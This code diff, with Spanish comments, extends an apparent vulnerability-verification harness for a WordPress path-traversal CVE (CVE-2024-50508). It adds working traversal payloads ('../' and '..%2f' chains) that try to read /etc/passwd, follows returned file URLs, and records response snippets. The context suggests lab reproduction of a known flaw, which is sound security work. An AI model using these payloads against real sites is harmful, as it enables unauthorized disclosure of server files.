@@ -54,6 +54,13 @@ _ID_HINTS = ("user_id", "uid", "id", "target", "target_id", "user")
 _EMAIL_HINTS = ("email", "mail", "user_email")
 _PASS_HINTS = ("pass", "password", "pwd", "user_pass")
 _PATH_HINTS = ("file", "path", "page", "template", "include", "doc", "filename", "tpl", "view")
+# firma inequivoca de la primera linea de /etc/passwd en cualquier Linux (root, uid/gid 0) --
+# usada como fallback de path-traversal cuando el canario propio no se confirma (ver
+# verify_wordpress_path_traversal): a diferencia del canario (en /tmp, plantado por nosotros),
+# /etc/passwd ya existe siempre, con 0644 legible por cualquier usuario, y es el objetivo EXACTO
+# que demuestra el PoC publico ya divulgado de CVE-2024-50508 y de la mayoria de CVEs de este
+# tipo -- si esto se confirma y el canario no, aisla el problema a algo especifico del canario.
+_PASSWD_SIGNATURE_RE = re.compile(r"root:[^:\n]*:0:0:")
 _CMD_HINTS = ("cmd", "command", "exec", "host", "ip", "ping", "target", "query", "addr",
              "domain", "shell")
 _SQLI_HINTS = ("id", "search", "q", "query", "name", "term", "filter", "sort", "order")
@@ -1240,8 +1247,16 @@ def verify_wordpress_path_traversal(
             except Exception as e:
                 tried.append({"payload": payload_value, "error": str(e)})
                 continue
+            # un recorte corto del cuerpo real (NO solo si/no hay secreto) en CADA intento --
+            # confirmado en vivo, CVE-2024-50508: sin esto, un negativo (file_exists()/copy()
+            # fallando por permisos, un error de la propia app...) no se puede diagnosticar sin
+            # volver a lanzar el ataque a mano o leer el codigo del plugin; con el cuerpo real
+            # delante (p.ej. '{"status":"error","message":"File is not moved..."}') se ve al
+            # momento si el servidor esta rechazando el intento y por que, en vez de tener que
+            # adivinarlo desde fuera.
             tried.append({"payload": payload_value, "status": resp.status_code,
-                          "secret_presente": secret in (resp.text or "")})
+                          "secret_presente": secret in (resp.text or ""),
+                          "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
             # patron "copia-y-sirve" (ver _extract_followable_urls): algunos endpoints no
             # reflejan el contenido en ESTA respuesta, copian el fichero a una ruta publica
             # nueva y devuelven DONDE quedo -- hay que pedirla aparte para ver el secreto real.
@@ -1288,8 +1303,71 @@ def verify_wordpress_path_traversal(
                            f"the secret planted at {canary_path}, outside the intended web "
                            f"directory.")
                 break
+        # ultimo recurso si el canario (en /tmp, fuera del volumen web) no se confirmo: repetir
+        # las mismas 40 variantes pero pidiendo literalmente /etc/passwd -- el objetivo EXACTO
+        # que demuestra el PoC publico ya divulgado de esta CVE. Universal en cualquier Linux,
+        # sin permisos especiales para leerlo (0644, cualquier usuario), asi que si esto SI
+        # devuelve la firma inequivoca de /etc/passwd y el canario no, aisla el problema a algo
+        # especifico del fichero/ruta del canario (o de como se plantea), no del endpoint en si.
+        tried_passwd = []
+        if not found:
+            step("el canario no se confirmo -- probando tambien con /etc/passwd literal (el "
+                 "mismo objetivo que demuestra el PoC publico ya divulgado, para aislar si el "
+                 "problema es del canario o del endpoint)...")
+            passwd_attempts = ["etc/passwd", "/etc/passwd"]
+            passwd_attempts += [("../" * n) + "etc/passwd" for n in depths]
+            passwd_attempts += [("..%2f" * n) + "etc/passwd" for n in depths]
+            for payload_value in passwd_attempts:
+                payload = (dict(parameters) if isinstance(parameters, dict)
+                          else {p: "" for p in (parameters or [])})
+                payload[path_param] = payload_value
+                step(f"probando {m} {endpoint} con {path_param}={payload_value!r} "
+                     f"(/etc/passwd)...")
+                try:
+                    resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                       data=payload if m != "GET" else None,
+                                       params=payload if m == "GET" else None, timeout=20)
+                except Exception as e:
+                    tried_passwd.append({"payload": payload_value, "error": str(e)})
+                    continue
+                body = resp.text or ""
+                followed_body, follow_url = body, None
+                if not _PASSWD_SIGNATURE_RE.search(body):
+                    for candidate in _extract_followable_urls(body, boot.base_url):
+                        try:
+                            candidate_resp = boot.sub_sess.request("GET", candidate, timeout=20)
+                        except Exception:
+                            continue
+                        if _PASSWD_SIGNATURE_RE.search(candidate_resp.text or ""):
+                            followed_body, follow_url = candidate_resp.text, candidate
+                            break
+                tried_passwd.append({"payload": payload_value, "status": resp.status_code,
+                                     "passwd_signature_presente": bool(
+                                         _PASSWD_SIGNATURE_RE.search(followed_body)),
+                                     "respuesta_cuerpo_recorte": body[:300]})
+                if _PASSWD_SIGNATURE_RE.search(followed_body):
+                    found = True
+                    res.evidence["payload_ganador"] = payload_value
+                    res.evidence["objetivo_ganador"] = "/etc/passwd"
+                    if follow_url:
+                        res.evidence["url_seguida"] = follow_url
+                    res.evidence["respuesta_cuerpo_recorte"] = followed_body[:500]
+                    step((f"VERIFICADO: /etc/passwd aparecio literal en la respuesta con "
+                         f"{path_param}={payload_value!r} (via {follow_url})" if follow_url else
+                         f"VERIFICADO: /etc/passwd aparecio literal en la respuesta con "
+                         f"{path_param}={payload_value!r}."))
+                    break
+            res.evidence["intentos_etc_passwd"] = tried_passwd
         res.evidence["intentos"] = tried
-        if found:
+        if found and res.evidence.get("objetivo_ganador") == "/etc/passwd":
+            res.verified = True
+            res.ok = True
+            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
+                          f"{res.evidence['payload_ganador']!r} devolvio /etc/passwd literal "
+                          f"(el canario propio no se confirmo, pero /etc/passwd -- el objetivo "
+                          f"exacto del PoC publico -- si; el traversal es real, algo especifico "
+                          f"del canario/su ruta lo bloqueaba)")
+        elif found:
             res.verified = True
             res.ok = True
             res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
@@ -1297,10 +1375,20 @@ def verify_wordpress_path_traversal(
                           f"plantado en {canary_path} (fuera del directorio web)")
         else:
             res.ok = True
+            # el cuerpo real del PRIMER intento (la ruta absoluta sin tocar, la mas simple de
+            # las 40 -- si el endpoint no sanea nada, es la que mas deberia parecerse a lo que
+            # el PoC publico ya demostro) es la pista mas util para diagnosticar un negativo sin
+            # tener que repetir el ataque a mano ni leer el codigo del plugin: un error de la
+            # propia app (p.ej. "File is not moved") apunta a algo del servidor (permisos del
+            # fichero canario, una ruta que la app rechaza...), no a que el payload sea el
+            # equivocado.
+            sample = next((t.get("respuesta_cuerpo_recorte") for t in tried
+                          if t.get("respuesta_cuerpo_recorte")), "")
             res.detail = (f"se probaron {len(tried)} variantes de ruta para {path_param} y "
-                          f"ninguna devolvio el secreto plantado -- el traversal no se confirmo "
-                          f"(puede necesitar otra profundidad de '../', otra codificacion, o el "
-                          f"endpoint/parametro no son los reales)")
+                          f"ninguna devolvio el secreto plantado, ni /etc/passwd literal -- el "
+                          f"traversal no se confirmo (puede necesitar otra profundidad de "
+                          f"'../', otra codificacion, o el endpoint/parametro no son los reales)" +
+                          (f". Respuesta real del primer intento: {sample!r}" if sample else ""))
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
